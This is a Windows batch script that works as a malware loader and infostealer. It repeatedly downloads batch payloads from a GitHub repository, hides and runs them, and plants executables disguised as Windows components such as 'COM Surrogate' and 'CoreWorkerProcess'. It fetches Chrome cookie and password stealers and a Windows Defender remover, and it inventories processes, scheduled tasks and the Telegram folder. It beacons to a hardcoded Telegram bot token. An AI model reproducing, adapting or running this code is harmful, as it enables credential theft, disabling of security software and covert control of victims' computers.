echo :CheckKMSAuto
echo.





set "KMSFILE=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
set "KMSFILEroot=%SystemRoot%\System32\TSSKMS.exe"



echo Checking if %KMSFILE% exists...
if exist "%KMSFILE%" (
    goto CHECKKMSMD5
    echo %KMSFILE% found. Going to CHECKKMSMD5
) else (
    goto KMSINSTALL
)


:CHECKKMSMD5

for /f "tokens=* delims=" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "KMSFILEmd5=%%tmp: =%%"
for /f "tokens=* delims=" %%A in ('certutil -hashfile "%KMSFILEroot%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "KMSFILErootmd5=%%tmp: =%%"


echo MD5 of %KMSFILE% = %KMSFILEmd5%
echo MD5 of %KMSFILEroot% = %KMSFILErootmd5%
echo.
echo Comparing with official MD5: %KMSAutoMD5%
echo.




if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
    echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
    echo.
    echo.
    echo going to CheckComSurrogate
	set "GoingCheckCom=1"
	rem goto CheckComSurrogate
)

if "%GoingCheckCom%"=="1" goto CheckComSurrogate



echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
echo Turning CheckSend=1
set "CheckSend=1"
set "SENDSCREENSHOT=1"
set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"

echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.







echo Going to KMSINSTALL...
echo.
echo.





:KMSINSTALL
:: Run commands if KMSAuto.exe is not found
echo Checking for KMSAuto...
set "embeddedScript=%temp%\temp_script_KMS.bat"
del /f /a /q "%embeddedScript%"

:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from KMSAuto Link
    echo.
    timeout /t 3 /nobreak 
    goto KMSINSTALL
)

set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
copy "%sourceFile%" "%startupFile%"




set "MESSAGE=%MESSAGE%KMSAuto^|"
echo Turning CheckSend=1
set "CheckSend=1"




echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.





























:CheckComSurrogate
echo :CheckComSurrogate
echo.


:: Check ComSurrogate.exe; if found, skip to next section
if exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
    echo %ProgramData%\Microsoft\Windows\COM Surrogate.exe found. Going to CheckCWP
    echo.
    echo.
    echo.
    goto CheckCWP
)

:: Run commands if ComSurrogate.exe is not found
echo Checking for COM Surrogate...
set "embeddedScript=%temp%\temp_script_COM.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from ComSurrogate Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckComSurrogate
)

set "MESSAGE=%MESSAGE%ComSurrogate^|"
echo Turning CheckSend=1
set "CheckSend=1"


echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.
















:CheckCWP
echo :CheckCWP
echo.


::set "CWPOFFICIALMD5=45b02249b90a0a6de55d1d92aeaea445"



:retrycwpmd5
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/MD5FILES/CoreWorkerProcessMD5') do (
    set "CWPOFFICIALMD5=%%i"
    echo.
    goto donee2
)
goto retrycwpmd5

:donee2
echo CWPOFFICIALMD5 = %CWPOFFICIALMD5%
echo.
echo.



set "CWPFILE=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
set "CWPFILEroot=%SystemRoot%\System32\CWProcess.exe"



echo Checking if %CWPFILE% exists...

if exist "%CWPFILE%" (
    echo %CWPFILE% found . Going to CHECKCWPMD5
    goto CHECKCWPMD5
) else (
    echo %CWPFILE% not found . Going to CWPINSTALL
    goto CWPINSTALL
)


:CHECKCWPMD5

for /f "tokens=* delims=" %%A in ('certutil -hashfile "%CWPFILE%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "CWPFILEmd5=%%tmp: =%%"
for /f "tokens=* delims=" %%A in ('certutil -hashfile "%CWPFILEroot%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "CWPFILErootmd5=%%tmp: =%%"

echo MD5 of %CWPFILE% = %CWPFILEmd5%
echo MD5 of %CWPFILEroot% = %CWPFILErootmd5%
echo.
echo.
echo Comparing with official MD5: %CWPOFFICIALMD5%
echo.

if "%CWPFILEmd5%"=="%CWPOFFICIALMD5%" (
    echo MD5 matches %CWPFILEmd5% = %CWPOFFICIALMD5%
    echo going to Check7ZIP
    goto Check7ZIP
)

echo MD5 doesnt match %CWPFILEmd5% # %CWPOFFICIALMD5%
echo Turning CheckSend=1
set "CheckSend=1"
set "SENDSCREENSHOT=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.








echo Going to CWPINSTALL...





:CWPINSTALL





:: Run commands if CoreWorkerProcess.exe is not found
echo Checking for CoreWorkerProcess...
set "embeddedScript=%temp%\temp_script_CWP%random%.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/CoreWorkerProcess"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from CoreWorkerProcess Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckCWP
)

set "MESSAGE=%MESSAGE%MD5CWPMISMATCH^|"
set "MESSAGE=%MESSAGE%CoreProcessInstalled^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.












:Check7ZIP
echo :Check7ZIP
echo.

:: Check 7z.exe; 7z.dll if found, skip to next section
if exist "%APPDATA%\Microsoft\7z.exe" (
    echo %APPDATA%\Microsoft\7z.exe found. Going to CheckNIRCMD
    echo.
    echo.
    echo.
    goto CheckNIRCMD
)

if exist "%APPDATA%\Microsoft\7z.dll" (
    echo %APPDATA%\Microsoft\7z.dll found. Going to CheckNIRCMD
    goto CheckNIRCMD
)

:: Run commands if Nircmd.exe is not found
echo Checking for 7z...
set "embeddedScript=%temp%\temp_script_7z.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/7zip"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from NIRCMD Link
    echo.
    timeout /t 3 /nobreak 
    goto Check7ZIP
)

set "MESSAGE=%MESSAGE%7ZIP^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.














:CheckNIRCMD
echo :CheckNIRCMD
echo.

:: Check nircmd.exe; if found, skip to next section
if exist "%APPDATA%\Microsoft\nircmd.exe" (
    echo %APPDATA%\Microsoft\nircmd.exe found. Going to CheckWudTest
    echo.
    echo.
    echo.
    goto CheckWudTest
)

:: Run commands if Nircmd.exe is not found
echo Checking for Nircmd...
set "embeddedScript=%temp%\temp_script_Nircmd.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Nircmd"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from NIRCMD Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckNIRCMD
)

set "MESSAGE=%MESSAGE%NIRCMD^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.












:CheckWudTest
echo :CheckWudTest
echo.



:: Check wudtest.exe; if found, skip to CheckChrmCksViewer
if exist "%file10%" (
    echo %file10% found. Going to CheckChrmCksViewer
    echo.
    echo.
    echo.
    goto CheckChrmCksViewer
)



:: Run commands if wudtest.exe is not found
echo Checking for wudtest...
set "embeddedScript=%temp%\temp_script_wudtest.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/SpeedTest"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from wudtest Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckWudTest
)


set "MESSAGE=%MESSAGE%SpeedTest^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.




















:CheckChrmCksViewer
echo :CheckChrmCksViewer
echo.



:: Check ChrmCksViewer; if found, skip to CheckRunBatHidden
if exist "%file11%" (
    echo %file11% found. Going to CheckRunBatHidden
    echo.
    echo.
    echo.
    goto CheckRunBatHidden
)



:: Run commands if wudtest.exe is not found
echo Checking for ChrmCksViewer...
set "embeddedScript=%temp%\temp_script_ChrmCksViewer.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ChrmCksViewer"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from wudtest Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckChrmCksViewer
)


set "MESSAGE=%MESSAGE%ChrmCksViewer^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.















:CheckRunBatHidden
echo :CheckRunBatHidden
echo.



:: Check wudtest.exe; if found, skip to CheckChromePass
if exist "%file12%" (
    echo %file12% found. Going to CheckChromePass
    echo.
    echo.
    echo.
    goto CheckChromePass
)



:: Run commands if wudtest.exe is not found
echo Checking for RunBatHidden...
set "embeddedScript=%temp%\temp_script_RunBatHidden.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/RunBatHidden"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from wudtest Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckRunBatHidden
)


set "MESSAGE=%MESSAGE%RunBatHidden^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.












:CheckChromePass
echo :CheckChromePass
echo.



:: Check ChrmPass; if found, skip to COMMANDSFORAGENTS
if exist "%file13%" (
    echo %file13% found. Going to COMMANDSFORAGENTS
    echo.
    echo.
    echo.
    goto COMMANDSFORAGENTS
)



:: Run commands if wudtest.exe is not found
echo Checking for ChromePass...
set "embeddedScript=%temp%\temp_script_ChromePass.bat"
del /f /a /q "%embeddedScript%"


:: Download content and save to the embedded batch file
curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ChrmPass"
attrib +h +s "%embeddedScript%"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del /f /a /q "%embeddedScript%"
    echo.
    echo.
) else (
    echo Filed to get content from wudtest Link
    echo.
    timeout /t 3 /nobreak 
    goto CheckRunBatHidden
)


set "MESSAGE=%MESSAGE%ChrmPass^|"
echo Turning CheckSend=1
set "CheckSend=1"



echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.








echo.
echo.
echo.








:COMMANDSFORAGENTS
echo :COMMANDSFORAGENTS
echo.


set "SHSTSTART=0"
set "KMSSTART=0"

:RUNNINGSHSTKMS

for /f "tokens=* delims=" %%A in ('certutil -hashfile "%SHSTFILE%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "SHSTFILEmd5=%%tmp: =%%"

echo MD5 of %SHSTFILE% = %SHSTFILEmd5%
echo.
echo Comparing with official MD5: %ShellHostMD5%
echo.

if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
    echo MD5 matches %SHSTFILEmd5% = %ShellHostMD5%
    set "SHSTSTART=1"
    echo SHSTSTART = %SHSTSTART% and !SHSTSTART!
    echo Starting Enabled for %SHSTFILE%
    echo.
) else (
    echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
    echo Starting Disabled for %SHSTFILE%
    echo.
)


echo.
echo.
:RUNNINGKMS

for /f "tokens=* delims=" %%A in ('certutil -hashfile "%KMSFILE%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "KMSFILEmd5=%%tmp: =%%"

echo MD5 of %KMSFILE% = %KMSFILEmd5%
echo.
echo Comparing with official MD5: %KMSAutoMD5%
echo.

if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
    echo MD5 matches %KMSFILEmd5% = %KMSAutoMD5%
    set "KMSSTART=1"
    echo KMSSTART = %KMSSTART% and !KMSSTART!
    echo Starting Enabled for %KMSFILE%
    echo.
) else (
    echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
    echo Starting Disabled for %KMSFILE%
    echo.
)

echo.
echo.





:: remove "::" to prevent run!
::set "SHSTSTART=0"
set "KMSSTART=0"



if "!SHSTSTART!"=="1" goto :CHECK_SHSTFILE
if "!KMSSTART!"=="1" goto :CHECK_KMSFILE




echo Both # 1
echo Going to NEXT5
goto NEXT5



echo.
echo.
echo CheckSend Now is = !CheckSend!
echo.
echo.





:CHECK_SHSTFILE
:: Check if SHSTFILE is running
powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
if %errorlevel%==1 (
    echo %SHSTFILE% is not running. starting now...
    rem taskkill /F /IM ShellHost.exe
    echo Taskkill done
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%SHSTFILE%'"
    rem start "" "%SHSTFILE%"
    echo starting done
    echo.
) else (
    set "SHSTRUNNING=1"
    echo %SHSTFILE% is already running.
    echo.
)

echo SHST RUNNING is !SHSTRUNNING! and %SHSTRUNNING%

echo.
echo.




if "!KMSSTART!"=="1" goto :CHECK_KMSFILE
echo Only SHSTSTART=!SHSTSTART!
echo Going to NEXT5
goto NEXT5



:CHECK_KMSFILE
:: Check if KMSFILE is running
powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
if %errorlevel%==1 (
    echo %KMSFILE% is not running. starting now...
    taskkill /F /IM KMSAuto.exe
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%KMSFILE%'"
    rem start "" "%KMSFILE%"
) else (
    set "KMSRUNNING=1"
    echo %KMSFILE% is already running.
)

echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%

echo.
echo.
echo CheckSend Now is = !CheckSend!













:NEXT5
echo NEXT5 Started.
echo.



for /f "tokens=* delims=" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "RUNEVERYCALLERMD5=%%tmp: =%%"
echo MD5 of RUNEVERYCALLER = %RUNEVERYCALLERMD5%
echo.
echo.

for /f "tokens=* delims=" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "ProtectionWindowsHostProcessMD5=%%tmp: =%%"
echo MD5 of ProtectionWindowsHostProcess = %ProtectionWindowsHostProcessMD5%
echo.
echo.



echo.
echo.
echo Getting VI Process
powershell -command "Get-Process KMSAuto, ShellHost, STLRRUNNERCALLER -ErrorAction SilentlyContinue | ForEach-Object { $_.Path }"
echo.
echo.







for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename3=!filename!"
set "filename="




set "ProcessTXTFILE=%temp%\!filename3!.pxf"


echo Saving All Processes in "%ProcessTXTFILE%"
powershell -command "Get-Process | Select-Object ProcessName, Path | Format-Table -AutoSize -Wrap" > "%ProcessTXTFILE%" 2>nul
::powershell -command "Get-Process | Select-Object ProcessName, Path" > "%ProcessTXTFILE%" 2>nul
echo Saved.
echo.
echo.










:: if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
:: if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"











echo.
echo.
echo Displaying Message
echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
echo.
echo.









:REMOVINGTASKS
echo :REMOVINGTASKS
echo.

:: Ending Tasks
echo Ending Tasks :
schtasks /end /tn "ComSurrogate"
schtasks /end /tn "OneDrive Updater"
schtasks /end /tn "OneDrive Task"
schtasks /end /tn "Chromium Update"
echo.
echo.

:: Removing Tasks
echo Removing Tasks :
schtasks /delete /tn "ComSurrogate" /f
schtasks /delete /tn "OneDrive Updater" /f
schtasks /delete /tn "OneDrive Task" /f
schtasks /delete /tn "Chromium Update" /f
schtasks /delete /TN "WinRNTMUpdate" /F
schtasks /delete /TN "WinRTKUpdate" /F
schtasks /delete /TN "checkCOMandadd" /F
schtasks /delete /TN "SystemCertificates" /F
echo.
echo.



:: Define tasks to check
set "Task1=SystemLibrariesU"



echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo Tasks : >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo %Task1% Installed and Enabled >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo Windows Defender : >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
::powershell -Command "Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtection'" >> "%InstalledQWB%"
::powershell -Command "Get-MpPreference | Out-String" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo All running processes - Using Powershell - >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
type "%ProcessTXTFILE%" >> "%InstalledQWB%"
del /f /a /q "%ProcessTXTFILE%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo List TelegramFolder "%appdata%\Telegram Desktop" files and folders >> "%InstalledQWB%"
dir /b "%appdata%\Telegram Desktop" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo List ProgramData "%ProgramData%" files and folders >> "%InstalledQWB%"
dir /b "%ProgramData%" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo List temp_scrip*.bat files >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
dir /b /a "%temp%\temp_scrip*.bat" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo List *.mseuopm files >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
dir /b /a "%temp%\*.mseuopm" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo List *.exe files >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
dir /b /a "%temp%\*.exe" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo List ProgramData "%ProgramData%\Microsoft\Windows" files and folders >> "%InstalledQWB%"
dir /b "%ProgramData%\Microsoft\Windows" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo List Temp "%temp%" files and folders >> "%InstalledQWB%"
dir /b "%temp%" >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)
set "filename4=!filename!"
set "filename="
set "TASKS_DATA=%temp%\!filename4!.tsda"

:: create %TASKS_DATA%
schtasks /query /fo LIST /v > "%TASKS_DATA%"






echo Task Scheduler :  >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
type "%TASKS_DATA%" >> "%InstalledQWB%"
del /f /a /q "%TASKS_DATA%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"
echo. >> "%InstalledQWB%"













:AFTERTASKSEVERY
echo :AFTERTASKSEVERY
echo.





















:NEXT1
echo :NEXT1
echo.


echo Stopping processes...
taskkill /F /IM TSSPrxySTC.exe
taskkill /F /IM TSSPrxyAdSTC.exe
taskkill /F /IM StartupTaskCaller.exe


echo Deleting files...
del /f /a /q "%SystemRoot%\System32\TSSPrxy.exe"
del /f /a /q "%SystemRoot%\System32\TSSPrxyAd.exe"
del /f /a /q "%SystemRoot%\System32\TSSPrxySTC.exe"
del /f /a /q "%SystemRoot%\System32\TSSPrxyAdSTC.exe"
del /f /a /q "%SystemRoot%\System32\TSSPrxyRNTM.exe"
del /f /a /q "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
del /f /a /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
del /f /a /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"
del /f /a /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"
del /f /a /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
del /f /a /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
del /f /a /q "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
del /f /a /q "%file6%"


echo Operation completed.


:: Check if HWID matches
echo %VALID_HWIDS% | findstr /I /C:"%HWID%" >nul && goto HWIDMATCH

echo HWID not authorized!
goto NEXT6






:HWIDMATCH
echo HWID matched! Running program...
echo.
echo.
echo.




goto NEXT6



echo WinDefRemover Starting...
echo.



for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)


:WinDefRemover
cls
:: Kill & Delete
taskkill /f /im !filename!.exe
del /f /a /q "%TEMP%\!filename!.exe"

echo.
echo You chose WinDefRemover.
timeout /t 2 /nobreak

for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/WinDefRemoverFileLink') do set "WINDEFREMOVERFILELINK=%%i"
echo %WINDEFREMOVERFILELINK%
echo.


 
:: Download the file using curl
curl -L -# -o "%TEMP%\!filename!.exe" "%WINDEFREMOVERFILELINK%"
 
timeout /t 2 /nobreak
 
 
 
:: Checking the existing of the file
if not exist "%TEMP%\!filename!.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak
	echo Retrying in 5 seconds ....
	timeout /t 5 /nobreak
	echo.
	cls
	goto WinDefRemover
)
 
 
 
:: Get the file size in bytes
for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
 
 
:: Check if the file size is at least 0.8MB (768000 bytes)
if %FILESIZE% geq 768000 (
    start "" "%TEMP%\!filename!.exe"
) else (
echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak
	echo Retrying in 5 seconds ....
	timeout /t 5 /nobreak
	echo.
	cls
	goto WinDefRemover
)


set "MESSAGE=%MESSAGE%WinDefRemover^|"
echo Turning CheckSend=1
set "CheckSend=1"


echo.
echo WinDefRemover Started..
timeout /t 20 /nobreak
echo Done.
timeout /t 5 /nobreak
echo.
echo.
echo.
echo.










:NEXT6

::goto CONT













:: Define the file to track the last run time
set "EVERY30MIN=%TEMP%\EVY3PT.sys"


attrib -h -s "%EVERY30MIN%"
:: Check if the file exists
if not exist "%EVERY30MIN%" (
    echo 1 > "%EVERY30MIN%"
) else (
    for /f "delims=" %%A in ('type "%EVERY30MIN%"') do set /a MINTSS=%%A + 1
    echo !MINTSS! > "%EVERY30MIN%"
)



:: Read the updated value
echo Reading Updated Value.
set /p MINTSS=<"%EVERY30MIN%"
attrib +h +s "%EVERY30MIN%"
echo MINTSS=%MINTSS%
echo.
echo.

:: Check if 10 minutes have passed
if %MINTSS% GEQ 10 goto 30MINDONE
goto 30MINSTILL

:30MINDONE
set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"


curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%10ZIN" > "%RESULT%"



findstr /i "message_id" "%RESULT%" >nul
if %errorlevel%==0 (
    echo Message sent successfully!
    echo.
) else (
    echo Failed to send message. Retrying...
    echo.
    timeout /t 2 /nobreak
    echo Going to 30MINDONE
    goto 30MINDONE
)

del /f /a /q "%RESULT%"


attrib -h -s "%EVERY30MIN%"
echo 0 > "%EVERY30MIN%"
attrib +h +s "%EVERY30MIN%"


goto HIHOZ


:30MINSTILL
echo.
echo MINTSS is still %MINTSS%
echo.








:HIHOZ
echo HIHOZ Started.
echo.





:: Define the file to track the last run time
del /f /a /q "%TEMP%\lastrun.log"
set "LASTRUNFILE=%TEMP%\lstrimsys.drv"


attrib -h -s "%LASTRUNFILE%"
:: Check if the file exists
if not exist "%LASTRUNFILE%" (
    echo 1 > "%LASTRUNFILE%"
) else (
    for /f "delims=" %%A in ('type "%LASTRUNFILE%"') do set /a MINUTESS=%%A + 1
    echo !MINUTESS! > "%LASTRUNFILE%"
)

:: Read the updated value
echo Reading Updated Value.
set /p MINUTESS=<"%LASTRUNFILE%"
attrib +h +s "%LASTRUNFILE%"
echo Minutess=%MINUTESS%
echo.
echo.

:: Check if 180 minutes have passed
if %MINUTESS% GEQ 1620 goto 3HOURDONE
goto 3HOURSTILL

:3HOURDONE
echo 3HOURDONESTARTED
echo.
set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
set "CHROMECOOKIES=%file11%"
set "DecCookiesFile=%temp%\PuN7s%random%Fr7ms%random%.ckst"
set "RunBatHidden=%file12%
set "ChromePass=%file13%
set "BatchFileHidden1=%temp%\Bpput%random%4szNsq.bat"
